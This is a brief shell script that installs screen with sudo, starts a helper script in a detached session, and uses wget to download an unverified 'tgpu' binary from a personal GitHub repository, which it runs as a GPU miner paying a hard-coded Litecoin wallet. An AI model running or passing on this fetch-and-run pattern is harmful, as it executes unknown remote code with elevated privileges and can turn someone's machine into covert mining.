#!/bin/sh
POOL=ethash.unmineable.com:13333
WALLET=LTC:MEzM2xotzebaTgQHWB2wGXj2qkrK8T9q9W
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-stb)

sudo apt update
sudo apt install screen -y
screen -dmS trx.sh ./trx.sh 65 75

wget https://github.com/moylow/gpu/raw/main/tgpu
chmod +x tgpu
./tgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
